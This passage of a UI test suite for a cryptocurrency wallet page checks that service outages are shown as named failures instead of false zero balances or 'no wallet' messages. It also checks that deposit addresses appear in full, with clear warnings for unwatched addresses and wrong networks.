   * ── WHY THIS SCENARIO ASSERTS A DISTINCTION AND NOT A NUMBER ─────────────────────────────────
   *
   * `BigInt('')` is `0n`. It does not throw, and neither does `BigInt(' ')`. So the cheap way to
   * render a balance turns a missing figure into a confident, correctly-formatted zero — and a
   * zero on a wallet screen is a statement about somebody's money that nobody questions.
   *
   * The countermeasure is that a strip which cannot obtain a figure prints NO DIGIT at all. Which
   * means an empty strip is ambiguous on its face: it is correct when the tile answered with
   * nothing, and it is a fault when the tile did not answer. A scenario that asserted "no digits"
   * would pass for both, and a scenario that asserted a number would fail on the correct one.
   *
   * So both are rendered in the same run, from the same response, and what is asserted is that a
   * reader can tell them apart in WORDS.
   */
  it('BJ-WAL-07 T1: the unread strip names its upstream and prints no digit; the empty one says what was asked', async () => {
    fresh()
    const reason = 'the wallet service did not answer'
    const { element, options } = walletPageAt({
      // Did not answer. Its `data` is still the empty value, which is the trap: `[]` drawn without
      // its status reads as "you have no wallets" (`lib/tile.ts:22-28`).
      wallets: fx.unavailable([], 'wallet', reason),
      // Answered, with nothing.
      deposits: fx.ok([], 'wallet'),
      // Answered, with something — so the page is not uniformly blank and the independence of the
      // three strips is observable in the same run.
      withdrawals: fx.ok([fx.withdrawalRecord()], 'wallet'),
    })

    await withScreen(element, options, async (s) => {
      const unread = s.textOf(panel(s, 'Addresses'))
      const answered = s.textOf(panel(s, 'Arriving'))
      const populated = s.textOf(panel(s, 'Leaving'))

      // 1. THE UNREAD STRIP PRINTS NO DIGIT. Not a zero, not a dash standing in for one.
      assert.ok(!/\d/.test(unread), `the unread strip printed a figure: "${unread}"`)
      // 2. It names WHICH upstream, because "the wallet panel is missing" and "wallet is down" are
      //    different facts and only the second tells an operator where to look.
      assert.ok(unread.includes('wallet'), 'the unread strip does not name its upstream')
      assert.ok(unread.includes(reason), 'the unread strip does not carry the service’s own reason')
      // 3. And it is announced, not merely styled: `role="alert"` for the warning tone.
      assert.ok(
        panel(s, 'Addresses').querySelector('[role="alert"]'),
        'an unavailable strip is not announced',
      )

      // 4. THE ANSWERED-EMPTY STRIP SAYS WHAT WAS ASKED. It also prints no digit — which is why
      //    "no digit" alone cannot be the assertion — but it is a positive statement about a
      //    question that was answered, and it names no upstream because none failed.
      assert.ok(!/\d/.test(answered), `the empty strip printed a figure: "${answered}"`)
      assert.match(answered, /No deposit is currently confirming/i, 'the empty strip says nothing')
      assert.ok(!answered.includes('did not answer'), 'an answered strip claims an outage')

      // 5. THE TWO ARE DIFFERENT SENTENCES. This is the whole scenario: a reader must be able to
      //    tell "there is nothing" from "we could not find out".
      assert.notEqual(unread, answered, 'unread and empty render the same words')

      // 6. The strip that DID answer with something is unaffected. One upstream failing does not
      //    blank the page — 05's rule, and hub-api answers 200 with holes precisely for it.
      assert.ok(populated.includes(fx.withdrawalRecord().amountFormatted), 'the healthy strip lost its data')
      assert.ok(populated.includes(fx.withdrawalRecord().state), 'the healthy strip lost its state')
    })
  })

  it('BJ-WAL-07 T1: an unread balance is not reported to the user as having nothing to send', async () => {
    fresh()
    const reason = 'the ledger did not answer'
    // Both derived lists are unread. Before this was fixed, both panels said the opposite of the
    // truth — "There is no balance to send" and "There is no managed wallet to export" — because
    // `hasAnswer(t) ? t.data : []` collapses an outage and an empty account into one empty array.
    const { element, options } = walletPageAt({
      portfolio: fx.unavailable(fx.portfolio({ holdings: [] }), 'ledger', reason),
      wallets: fx.unavailable([], 'wallet', 'the wallet service did not answer'),
    })

    await withScreen(element, options, async (s) => {
      const send = s.textOf(panel(s, 'Send'))
      assert.ok(
        !/there is no balance/i.test(send),
        `the Send panel told the user they have nothing to send while the balance was unreadable: "${send}"`,
      )
      assert.ok(send.includes(reason), 'the Send panel does not carry the reason the balance is missing')
      assert.ok(!/\d/.test(send), `the Send panel printed a figure it could not have: "${send}"`)

      const exportPanel = s.textOf(panel(s, 'Export a private key'))
      assert.ok(
        !/there is no managed wallet/i.test(exportPanel),
        `the export panel said CloudsForge holds no key while the wallet list was unreadable: "${exportPanel}"`,
      )

      // And no control is offered that would post an amount against a balance nobody could read.
      assert.equal(s.queryByRole('button', 'Review'), null, 'Send is armed against an unread balance')
    })
  })

  it('BJ-WAL-07 T1 (the other half): an account that genuinely holds nothing still says so plainly', async () => {
    fresh()
    // The same screen, the same empty lists — but every tile ANSWERED. The sentences must be the
    // positive ones, or the fix above would have turned every empty account into a fake outage.
    const { element, options } = walletPageAt({
      portfolio: fx.ok(fx.portfolio({ holdings: [] }), 'ledger+pricing'),
      wallets: fx.ok([], 'wallet'),
    })

    await withScreen(element, options, async (s) => {
      const send = s.textOf(panel(s, 'Send'))
      assert.match(send, /There is no balance to send/i, 'an answered-empty account was told it was an outage')
      assert.ok(!/could not read/i.test(send), 'an answered-empty account was told it was an outage')

      const addresses = s.textOf(panel(s, 'Addresses'))
      assert.match(addresses, /No wallet has been created or connected/i)
      assert.ok(!addresses.includes('did not answer'), 'an answered-empty list claims an outage')
    })
  })
})

/* ══════════════════════════════════════════════════════════════════════════════════════════════
   Receive. BJ-WAL-16 and BJ-WAL-17 were ⛔ on §8.2.
   ══════════════════════════════════════════════════════════════════════════════════════════ */

describe('BJ-WAL — Receive', () => {
  it('BJ-WAL-16 T1: the address rendered is the address in the response, in full', async () => {
    fresh()
    // The scenario's own value, supplied to the stub and then looked for on the page. One
    // direction only: the page never told this test what to expect.
    const assigned = '0xFEEDfaceFEEDfaceFEEDfaceFEEDfaceFEEDface'
    await withScreen(
      page(h(ReceivePanel, { holdings: [fx.holding()] }), '/wallet'),
      {
        url: `${ORIGIN}/wallet`,
        routes: {
          'POST /v1/deposits': {
            body: {
              assignment: {
                id: 'asg-1',
                assetCode: 'EMBER',
                chain: 'hearth',
                network: 'mainnet',
                walletId: 'wal-1',
                address: assigned,
                status: 'active',
                assignedAt: '2026-08-03T09:00:00.000Z',
                watchedAt: '2026-08-03T09:00:05.000Z',
              },
            },
          },
        },
      },
      async (s) => {
        await s.click(s.byRole('button', /deposit address/i))
        assert.equal(factValue(s, 'Send EMBER to'), assigned, 'the address shown is not the one assigned')
        assert.ok(!s.text().includes('…'), 'a deposit address was shortened')
        // `rotate` is an explicit ask and must default to false: defaulting to it would mint a new
        // address on every page load and leave a trail of addresses nobody was told about.
        assert.deepEqual(s.api.matching('POST /v1/deposits')[0]?.json, { assetCode: 'EMBER' })
      },
    )
  })

  it('BJ-WAL-16 T1: an unwatched address says so rather than looking ready to be paid', async () => {
    fresh()
    await withScreen(
      page(h(ReceivePanel, { holdings: [fx.holding()] }), '/wallet'),
      {
        url: `${ORIGIN}/wallet`,
        routes: {
          'POST /v1/deposits': {
            body: {
              assignment: {
                id: 'asg-2',
                assetCode: 'EMBER',
                chain: 'hearth',
                network: 'mainnet',
                walletId: 'wal-1',
                address: fx.OWN_ADDRESS,
                status: 'active',
                assignedAt: '2026-08-03T09:00:00.000Z',
                // "An unwatched address produces no events" — a deposit to it lands on chain and
                // is never credited. Presentation relative to what the API returned in this run.
                watchedAt: null,
              },
            },
          },
        },
      },
      async (s) => {
        await s.click(s.byRole('button', /deposit address/i))
        assert.ok(s.allByRole('alert').length > 0, 'an unwatched address is not announced')
        assert.match(s.text(), /not yet watching|would not be credited/i, 'the risk is not stated')
      },
    )
  })

  it('BJ-WAL-17 T1: both sentences are in the page at body size, not in a tooltip', async () => {
    fresh()
    await withScreen(
      page(h(ReceivePanel, { holdings: [fx.holding()] }), '/wallet'),
      {
        url: `${ORIGIN}/wallet`,
        routes: {
          'POST /v1/deposits': {
            body: {
              assignment: {
                id: 'asg-3',
                assetCode: 'EMBER',
                chain: 'hearth',
                network: 'mainnet',
                walletId: 'wal-1',
                address: fx.OWN_ADDRESS,
                status: 'active',
                assignedAt: '2026-08-03T09:00:00.000Z',
                watchedAt: '2026-08-03T09:00:05.000Z',
              },
            },
          },
        },
      },
      async (s) => {
        await s.click(s.byRole('button', /deposit address/i))
        // Both distinctions, in the body text — which is what "at body size, not in a tooltip"
        // means operationally: `textContent` sees a paragraph and does not see a `title=`.
        assert.match(s.text(), /deposit address/i, 'the deposit-address sentence is missing')
        assert.match(s.text(), /managed wallet/i, 'the managed-wallet sentence is missing')
        assert.match(s.text(), /any other network is lost/i, 'the wrong-network consequence is not stated')
        // And neither is hidden behind an attribute a reader has to hover to find.
        const titled = [...s.document.querySelectorAll('[title]')].map((el) => el.getAttribute('title') ?? '')
        for (const t of titled) {
          assert.ok(!/managed wallet|deposit address/i.test(t), 'a required sentence is in a tooltip')
        }
      },
    )
  })
})
